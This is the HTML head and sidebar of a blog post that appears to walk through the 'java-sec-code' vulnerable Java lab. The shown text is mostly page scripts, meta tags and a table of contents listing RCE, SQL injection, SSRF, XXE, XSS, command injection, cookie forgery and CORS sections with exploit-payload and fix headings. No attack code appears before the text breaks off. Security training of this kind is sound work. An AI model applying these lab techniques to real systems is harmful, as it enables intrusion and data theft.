<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="kinsey"><meta name="copyright" content="kinsey"><meta name="generator" content="Hexo 7.2.0"><meta name="theme" content="hexo-theme-yun"><title>java-sec-code | åŒ—æ­Œ</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/star-markdown-css@0.4.1/dist/yun/yun-markdown.min.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/prism-theme-vars/base.css"><script src="https://fastly.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
  [".post-card",".markdown-body img"].forEach((target)=> {
    ScrollReveal().reveal(target);
  })
}
document.addEventListener("DOMContentLoaded", initScrollReveal);
document.addEventListener("pjax:success", initScrollReveal);
</script><link rel="stylesheet" type="text/css" href="https://fastly.jsdelivr.net/npm/katex@latest/dist/katex.min.css"><script defer src="https://fastly.jsdelivr.net/npm/katex@latest/dist/katex.min.js"></script><link rel="stylesheet" type="text/css" href="https://fastly.jsdelivr.net/npm/katex@latest/dist/contrib/copy-tex.min.css"><script defer src="https://fastly.jsdelivr.net/npm/katex@latest/dist/contrib/copy-tex.min.js"></script><script defer src="https://fastly.jsdelivr.net/npm/katex@latest/dist/contrib/auto-render.min.js"></script><script type="module">import { renderKatex } from '/js/utils.js'
document.addEventListener("DOMContentLoaded", () => {
  renderKatex({
    ...{},
    ...undefined?.options,
  });
});</script><link rel="icon" type="image/svg+xml" href="/yun.svg"><link rel="mask-icon" href="/yun.svg" color="#0078E7"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="preconnect" href="https://fastly.jsdelivr.net/npm/" crossorigin><script id="yun-config">
    window.Yun = {}
    window.CONFIG = {"hostname":"kinseyy.github.io","root":"/","title":"åŒ—æ²åŸæ­Œ","version":"1.10.11","mode":"auto","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}.","hits":"${hits} results found","hits_time":"${hits} results found in ${time} ms"},"anonymous_image":"https://cdn.yunyoujun.cn/img/avatar/none.jpg","say":{"api":"https://el-bot-api.vercel.app/api/words/young"},"algolia":{"appID":"LWKPDLFKV6","apiKey":"6f230e5e2cdf36415bd02b48c1138c08","indexName":"my-hexo-blog","hits":{"per_page":8}},"fireworks":{"colors":null},"waline":{"config":{"enable":true,"serverURL":"https://kinsey-six.vercel.app","comment":true,"visitor":true,"emoji":["https://fastly.jsdelivr.net/gh/walinejs/emojis@latest/bilibili/","https://fastly.jsdelivr.net/gh/walinejs/emojis@latest/weibo/","https://fastly.jsdelivr.net/gh/walinejs/emojis@latest/qq/"],"locale":{"placeholder":"å¡«å†™é‚®ç®±ï¼Œå¯ä»¥æ”¶åˆ°å›å¤é€šçŸ¥å“¦ï½"},"requiredMeta":["nick"],"el":"#waline","lang":"en"},"cdn":"https://fastly.jsdelivr.net/npm/@waline/client@v2/dist/waline.js","dark":"html.dark"},"vendors":{"host":"https://fastly.jsdelivr.net/npm/","darken":"https://fastly.jsdelivr.net/npm/darken@1.5.0"}};
  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/hexo-theme-yun.js" type="module"></script><link rel="alternate" href="/atom.xml" title="åŒ—æ­Œ" type="application/atom+xml"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin><script async src="https://www.googletagmanager.com/gtag/js?id=G-1LL0D86CY9"></script><script>if (CONFIG.hostname === location.hostname) {
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());
  gtag('config', 'G-1LL0D86CY9');
}</script><script data-ad-client="ca-pub-2245427233262012" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><script>(function(){
  var bp = document.createElement('script');
  var curProtocol = window.location.protocol.split(':')[0];
  if (curProtocol === 'https') {
    bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
  }
  else {
    bp.src = 'http://push.zhanzhang.baidu.com/push.js';
  }
  var s = document.getElementsByTagName("script")[0];
  s.parentNode.insertBefore(bp, s);
})();</script><!-- Google Tag Manager --><script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer','GTM-M9KWR9L');</script><!-- End Google Tag Manager --><script>CONFIG.leancloudVisitors = {"enable":true,"app_id":"S8MhECl1Bg6fZt5ulKgIlajS-MdYXbMMI","app_key":"eLIsYKPJFnSJdwmHLoigqBR4","server_url":"https://s8mhecl1.api.lncldglobal.com"}</script><script defer src="/js/analytics/leancloud-visitors.js" type="module"></script><meta name="description" content="é¶åœºéœ€è®¿é—®http:&#x2F;&#x2F;localhost:8080&#x2F;index é»˜è®¤è´¦å·å¯†ç ä¸ºadmin admin123 é¢˜ç›®åœ¨æºç é‡Œï¼ˆäºæˆ‘æ‰¾åŠå¤©ï¼‰ ç”±äºåé¢ç¯å¢ƒæ˜¯dockerå¼€çš„ï¼Œè®¡ç®—å™¨å¯èƒ½å¼¹ä¸å‡ºæ¥ RCE1. &#x2F;rce&#x2F;runtime&#x2F;exec12345678910111213141516171819202122232425262728@GetMapping(&quot;&#x2F;r">
<meta property="og:type" content="article">
<meta property="og:title" content="java-sec-code">
<meta property="og:url" content="https://kinseyy.github.io/2025/06/26/java-sec-code/index.html">
<meta property="og:site_name" content="åŒ—æ­Œ">
<meta property="og:description" content="é¶åœºéœ€è®¿é—®http:&#x2F;&#x2F;localhost:8080&#x2F;index é»˜è®¤è´¦å·å¯†ç ä¸ºadmin admin123 é¢˜ç›®åœ¨æºç é‡Œï¼ˆäºæˆ‘æ‰¾åŠå¤©ï¼‰ ç”±äºåé¢ç¯å¢ƒæ˜¯dockerå¼€çš„ï¼Œè®¡ç®—å™¨å¯èƒ½å¼¹ä¸å‡ºæ¥ RCE1. &#x2F;rce&#x2F;runtime&#x2F;exec12345678910111213141516171819202122232425262728@GetMapping(&quot;&#x2F;r">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202412062003249.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202412062024910.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505222139928.png">
<meta property="og:image" content="c:/Users/11/AppData/Roaming/Typora/typora-user-images/image-20250525193848130.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505251952938.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505252024745.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505252035488.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505252101651.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505252101651.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505252119621.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505252145129.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505272017990.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505272053224.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505272105083.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505272132329.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505272138857.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505272146502.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505281929552.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505281948518.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507240850408.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507251640728.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507251643828.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507251644303.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507251712331.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507281127895.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507281443153.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507281145386.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507281417899.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507281418084.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507281439849.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507281459171.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507291046226.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507291407579.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507301105109.png">
<meta property="article:published_time" content="2025-06-26T12:58:52.000Z">
<meta property="article:modified_time" content="2025-07-30T03:36:12.321Z">
<meta property="article:author" content="kinsey">
<meta property="article:tag" content="java">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202412062003249.png"><script>(function() {
  if (CONFIG.mode !== 'auto') return
  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
  const setting = localStorage.getItem('darken-mode') || 'auto'
  if (setting === 'dark' || (prefersDark && setting !== 'light'))
    document.documentElement.classList.toggle('dark', true)
})()</script></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script>// Define global variable
IconifyProviders = {
  // Empty prefix: overwrite default API provider configuration
  '': {
    // Use custom API first, use Iconify public API as backup
    resources: [
        'https://api.iconify.design',
    ],
    // Wait for 1 second before switching API hosts
    rotate: 1000,
  },
};</script><script defer src="https://fastly.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="Table of Contents"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="Overview"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="kinsey"><img width="96" loading="lazy" src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202405312004243.jpeg" alt="kinsey"><span class="site-author-status" title="Looking for dawn.">ğŸŒ‘</span></a><div class="site-author-name"><a href="/about/">kinsey</a></div><span class="site-name">åŒ—æ­Œ</span><sub class="site-subtitle"></sub><div class="site-description"></div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="Home"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:home-4-line"></span></span></a><div class="site-state-item"><a href="/archives/" title="Archives"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:archive-line"></span></span><span class="site-state-item-count">220</span></a></div><div class="site-state-item"><a href="/categories/" title="Categories"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:folder-2-line"></span></span><span class="site-state-item-count">7</span></a></div><div class="site-state-item"><a href="/tags/" title="Tags"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="site-state-item-count">101</span></a></div><a class="site-state-item hty-icon-button" href="/about/#comment" title="ç•™è¨€æ¿"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:clipboard-line"></span></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="/atom.xml" title="RSS" target="_blank" style="color:orange"><span class="icon iconify" data-icon="ri:rss-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/kinseyy" title="GitHub" target="_blank" style="color:#6e5494"><span class="icon iconify" data-icon="ri:github-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://music.163.com/#/user/home?id=3954596483" title="ç½‘æ˜“äº‘éŸ³ä¹" target="_blank" style="color:#C20C0C"><span class="icon iconify" data-icon="ri:netease-cloud-music-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://travellings.link" title="Travelling" target="_blank" style="color:var(--hty-text-color)"><span class="icon iconify" data-icon="ri:train-line"></span></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="æˆ‘çš„å°ä¼™ä¼´ä»¬" style="color:dodgerblue"><span class="icon iconify" data-icon="ri:genderless-line"></span></a><a class="links-item hty-icon-button" href="/girls/" title="å–œæ¬¢çš„å¥³å­©å­" style="color:hotpink"><span class="icon iconify" data-icon="ri:women-line"></span></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><span class="icon iconify" data-icon="ri:contrast-2-line"></span></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#RCE"><span class="toc-number">1.</span> <span class="toc-text">RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-rce-runtime-exec"><span class="toc-number">1.1.</span> <span class="toc-text">1. &#x2F;rce&#x2F;runtime&#x2F;exec</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-rce-ProcessBuilder"><span class="toc-number">1.2.</span> <span class="toc-text">2.&#x2F;rce&#x2F;ProcessBuilder</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-rce-jscmd"><span class="toc-number">1.3.</span> <span class="toc-text">3.&#x2F;rce&#x2F;jscmd</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-rce-vuln-yarm"><span class="toc-number">1.4.</span> <span class="toc-text">4.&#x2F;rce&#x2F;vuln&#x2F;yarm</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-rce-groovy"><span class="toc-number">1.5.</span> <span class="toc-text">5.&#x2F;rce&#x2F;groovy</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">2.</span> <span class="toc-text">SQLæ³¨å…¥</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-sqli-jdbc-vuln"><span class="toc-number">2.1.</span> <span class="toc-text">1.&#x2F;sqli&#x2F;jdbc&#x2F;vuln</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-sqli-jdbc-ps-vuln"><span class="toc-number">2.2.</span> <span class="toc-text">2.&#x2F;sqli&#x2F;jdbc&#x2F;ps&#x2F;vuln</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-sqli-mybatis-vuln01"><span class="toc-number">2.3.</span> <span class="toc-text">3.&#x2F;sqli&#x2F;mybatis&#x2F;vuln01</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-sqli-mybatis-vuln02"><span class="toc-number">2.4.</span> <span class="toc-text">4.&#x2F;sqli&#x2F;mybatis&#x2F;vuln02</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-sqli-mybatis-orderby-vuln03"><span class="toc-number">2.5.</span> <span class="toc-text">5.&#x2F;sqli&#x2F;mybatis&#x2F;orderby&#x2F;vuln03</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5%E4%BF%AE%E5%A4%8D%E4%B8%8E%E9%98%B2%E6%8A%A4"><span class="toc-number">2.6.</span> <span class="toc-text">sqlæ³¨å…¥ä¿®å¤ä¸é˜²æŠ¤</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSTI"><span class="toc-number">3.</span> <span class="toc-text">SSTI</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ssti-velocity"><span class="toc-number">3.1.</span> <span class="toc-text">&#x2F;ssti&#x2F;velocity</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSRF"><span class="toc-number">4.</span> <span class="toc-text">SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-ssrf-urlConnection-vuln"><span class="toc-number">4.1.</span> <span class="toc-text">1.&#x2F;ssrf&#x2F;urlConnection&#x2F;vuln</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-ssrf-HttpURLConnection-vuln"><span class="toc-number">4.2.</span> <span class="toc-text">2.&#x2F;ssrf&#x2F;HttpURLConnection&#x2F;vuln</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-ssrf-openStream"><span class="toc-number">4.3.</span> <span class="toc-text">3.&#x2F;ssrf&#x2F;openStream</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-ssrf-HttpSyncClients-vuln"><span class="toc-number">4.4.</span> <span class="toc-text">4.&#x2F;ssrf&#x2F;HttpSyncClients&#x2F;vuln</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-ssrf-restTemplate-vuln1"><span class="toc-number">4.5.</span> <span class="toc-text">5.&#x2F;ssrf&#x2F;restTemplate&#x2F;vuln1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-ssrf-restTemplate-vuln2"><span class="toc-number">4.6.</span> <span class="toc-text">6.&#x2F;ssrf&#x2F;restTemplate&#x2F;vuln2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7-ssrf-hutool-vuln"><span class="toc-number">4.7.</span> <span class="toc-text">7.&#x2F;ssrf&#x2F;hutool&#x2F;vuln</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8-ssrf-dnsrebind-vuln"><span class="toc-number">4.8.</span> <span class="toc-text">8.&#x2F;ssrf&#x2F;dnsrebind&#x2F;vuln</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ssrf%E7%9A%84%E4%BF%AE%E5%A4%8D%E4%B8%8E%E9%98%B2%E6%8A%A4"><span class="toc-number">4.9.</span> <span class="toc-text">ssrfçš„ä¿®å¤ä¸é˜²æŠ¤</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CSRF"><span class="toc-number">5.</span> <span class="toc-text">CSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-csrf-post"><span class="toc-number">5.1.</span> <span class="toc-text">1.&#x2F;csrf&#x2F;post</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#csrf%E7%9A%84%E9%98%B2%E6%8A%A4"><span class="toc-number">5.2.</span> <span class="toc-text">csrfçš„é˜²æŠ¤</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS"><span class="toc-number">6.</span> <span class="toc-text">XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-xss-reflect"><span class="toc-number">6.1.</span> <span class="toc-text">1.&#x2F;xss&#x2F;reflect</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-xss-stored"><span class="toc-number">6.2.</span> <span class="toc-text">2.&#x2F;xss&#x2F;stored</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#xss%E9%98%B2%E6%8A%A4"><span class="toc-number">6.3.</span> <span class="toc-text">xssé˜²æŠ¤</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XXE"><span class="toc-number">7.</span> <span class="toc-text">XXE</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-xxe-xmlReader-vuln"><span class="toc-number">7.1.</span> <span class="toc-text">1.&#x2F;xxe&#x2F;xmlReader&#x2F;vuln</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-xxe-SAXBuilder-vuln"><span class="toc-number">7.2.</span> <span class="toc-text">2.&#x2F;xxe&#x2F;SAXBuilder&#x2F;vuln</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E4%BB%A3%E7%A0%81"><span class="toc-number">7.3.</span> <span class="toc-text">ä¿®å¤ä»£ç </span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-xxe-SAXReader-vuln"><span class="toc-number">7.4.</span> <span class="toc-text">3.&#x2F;xxe&#x2F;SAXReader&#x2F;vuln</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-xxe-SAXParser-vuln"><span class="toc-number">7.5.</span> <span class="toc-text">4.&#x2F;xxe&#x2F;SAXParser&#x2F;vuln</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-xxe-Digester-vuln"><span class="toc-number">7.6.</span> <span class="toc-text">5.&#x2F;xxe&#x2F;Digester&#x2F;vuln</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-xxe-DocumentBuilder-vuln"><span class="toc-number">7.7.</span> <span class="toc-text">6.&#x2F;xxe&#x2F;DocumentBuilder&#x2F;vuln</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7-xxe-DocumentBuilder-xinclude-vuln"><span class="toc-number">7.8.</span> <span class="toc-text">7.&#x2F;xxe&#x2F;DocumentBuilder&#x2F;xinclude&#x2F;vuln</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8-xxe-XMLReader-vuln"><span class="toc-number">7.9.</span> <span class="toc-text">8.&#x2F;xxe&#x2F;XMLReader&#x2F;vuln</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#9-xxe-DocumentHelper-vuln"><span class="toc-number">7.10.</span> <span class="toc-text">9.&#x2F;xxe&#x2F;DocumentHelper&#x2F;vuln</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8A%E8%BF%B0%E5%AD%98%E5%9C%A8XXE%E6%BC%8F%E6%B4%9E%E5%BA%93%E5%AF%B9%E6%AF%94"><span class="toc-number">7.11.</span> <span class="toc-text">ä¸Šè¿°å­˜åœ¨XXEæ¼æ´åº“å¯¹æ¯”</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%9F%E4%B8%80%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8payload"><span class="toc-number">7.12.</span> <span class="toc-text">ç»Ÿä¸€æ¼æ´åˆ©ç”¨payload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%9F%E4%B8%80%E4%BF%AE%E5%A4%8D%E4%BB%A3%E7%A0%81"><span class="toc-number">7.13.</span> <span class="toc-text">ç»Ÿä¸€ä¿®å¤ä»£ç </span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#10-xxe-xmlbeam-vuln"><span class="toc-number">7.14.</span> <span class="toc-text">10.&#x2F;xxe&#x2F;xmlbeam&#x2F;vuln</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#11-ooxml-readxlsx"><span class="toc-number">7.15.</span> <span class="toc-text">11&#x2F;ooxml&#x2F;readxlsx</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#12-xlsx-streamer-readxlsx"><span class="toc-number">7.16.</span> <span class="toc-text">12.&#x2F;xlsx-streamer&#x2F;readxlsx</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Commandinject"><span class="toc-number">8.</span> <span class="toc-text">Commandinject</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-codeinject"><span class="toc-number">8.1.</span> <span class="toc-text">1.&#x2F;codeinject</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-codeinject-host"><span class="toc-number">8.2.</span> <span class="toc-text">2.&#x2F;codeinject&#x2F;host</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="toc-number">8.3.</span> <span class="toc-text">æ¼æ´ä¿®å¤</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cookie%E4%BC%AA%E9%80%A0"><span class="toc-number">9.</span> <span class="toc-text">Cookieä¼ªé€ </span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-cookie-vuln01"><span class="toc-number">9.1.</span> <span class="toc-text">1.&#x2F;cookie&#x2F;vuln01</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-cookie-vuln02"><span class="toc-number">9.2.</span> <span class="toc-text">2.&#x2F;cookie&#x2F;vuln02</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-cookie-vuln03"><span class="toc-number">9.3.</span> <span class="toc-text">3.&#x2F;cookie&#x2F;vuln03</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-cookie-vuln04"><span class="toc-number">9.4.</span> <span class="toc-text">4.&#x2F;cookie&#x2F;vuln04</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-cookie-vuln05"><span class="toc-number">9.5.</span> <span class="toc-text">5.&#x2F;cookie&#x2F;vuln05</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-cookie-vuln06"><span class="toc-number">9.6.</span> <span class="toc-text">6.&#x2F;cookie&#x2F;vuln06</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">9.7.</span> <span class="toc-text">æ¼æ´åˆ©ç”¨.</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CORS"><span class="toc-number">10.</span> <span class="toc-text">CORS</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">10.1.</span> <span class="toc-text">åŸç†</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-cors-vuln-origin"><span class="toc-number">10.2.</span> <span class="toc-text">1.&#x2F;cors&#x2F;vuln&#x2F;origin</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-cors-vuln-setHeader"><span class="toc-number">10.3.</span> <span class="toc-text">2.&#x2F;cors&#x2F;vuln&#x2F;setHeader</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-cors-vuln-crossOrigin"><span class="toc-number">10.4.</span> <span class="toc-text">3.&#x2F;cors&#x2F;vuln&#x2F;crossOrigin</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81"><span class="toc-number">10.5.</span> <span class="toc-text">æ¼æ´éªŒè¯</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E9%98%B2%E5%BE%A1"><span class="toc-number">10.6.</span> <span class="toc-text">æ¼æ´é˜²å¾¡</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%EF%BC%881%EF%BC%89%E9%99%90%E5%88%B6origin"><span class="toc-number">10.6.1.</span> <span class="toc-text">ï¼ˆ1ï¼‰é™åˆ¶origin</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%EF%BC%882%EF%BC%89WebMvcConfigurer%E8%AE%BE%E7%BD%AECors"><span class="toc-number">10.6.2.</span> <span class="toc-text">ï¼ˆ2ï¼‰WebMvcConfigurerè®¾ç½®Cors</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%EF%BC%883%EF%BC%89spring-security%E8%AE%BE%E7%BD%AEcors"><span class="toc-number">10.6.3.</span> <span class="toc-text">ï¼ˆ3ï¼‰spring securityè®¾ç½®cors</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%EF%BC%884%EF%BC%89%E8%87%AA%E5%AE%9A%E4%B9%89filter%E8%AE%BE%E7%BD%AEcors"><span class="toc-number">10.6.4.</span> <span class="toc-text">ï¼ˆ4ï¼‰è‡ªå®šä¹‰filterè®¾ç½®cors</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%EF%BC%885%EF%BC%89CorsFilter%E8%AE%BE%E7%BD%AEcors"><span class="toc-number">10.6.5.</span> <span class="toc-text">ï¼ˆ5ï¼‰CorsFilterè®¾ç½®cors</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%EF%BC%886%EF%BC%89origin%E6%A3%80%E6%9F%A5"><span class="toc-number">10.6.6.</span> <span class="toc-text">ï¼ˆ6ï¼‰originæ£€æŸ¥</span></a></li></ol></li></ol></li><li class="toc-item 